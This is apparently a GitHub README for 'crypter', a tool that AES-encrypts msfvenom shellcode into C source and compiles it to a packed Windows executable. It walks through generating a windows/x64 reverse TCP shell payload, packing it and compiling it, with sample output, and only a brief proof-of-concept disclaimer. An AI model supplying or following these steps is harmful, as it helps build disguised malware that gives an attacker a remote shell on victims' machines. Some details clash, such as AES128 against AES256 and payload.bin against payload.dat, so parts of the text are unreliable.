# crypter
A shellcode crypto-packing tool for PoC (used with msfvenom/binary payloads)

This tool is for proof of concept only - please use responsibly.

Crypter is an auxiliary tool used for crypto packing msfvenom Windows payloads.
It uses AES128 (optimal for speed) to encrypt the payload and create C source from it from which you can compile (on linux or windows) into an executable.

You will need to install `MinGW` on Linux in order to compile `.exe` files:

```
$ apt-get update
$ apt-get install mingw-w64
```
________________________________

#Install

First, you will need to install the dependency/dependencies that `crypter` relies on (mainly OpenSSL):

```
$ apt-get install libssl-dev
```

Then, download this repository and install:

```
$ git clone https://github.com/ripmeep/crypter/ && cd crypter
$ gcc crypter.c -o crypter -lcrypto -I src/
```

#Usage

You will need to generate/already have a file that contains raw shellcode that you wish to execute in an exe file.
Metasploit is a good way of generating one for reverse shells/exploits. (https://github.com/rapid7/metasploit-framework/)

Generate a payload:

```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[LISTENER IP] LPORT=[LISTENER PORT] -f raw -o payload.bin
```

Run crypter to crypto pack the shellcode into a C source binary:

```
$ crypter payload.bin shell.exe
Extracted contents of payload.dat
Generated random AES256 Cryto Pack key: 924C2038A4B0DEFDF8420A2A896688CE900DD26109759A4CAE0681A147A64FA5
Generated random initialization vector: 34A7B03E8F2CD3023ED2BF78ECC8AE846D84B30F96E97BC02189820276DEB229
Successfully encrypted payload - generating exe file

Generated Crypto C source
Writing source to shell.exe.c...
Done
Now run: x86_64-w64-mingw32-gcc shell.exe.c -o shell.exe -fno-stack-protector
Finished
```

It will then display the MinGW command you need to run to compile the source file.
`x86_64-w64-mingw32-gcc shell.exe.c -o shell.exe -fno-stack-protector` (my case).
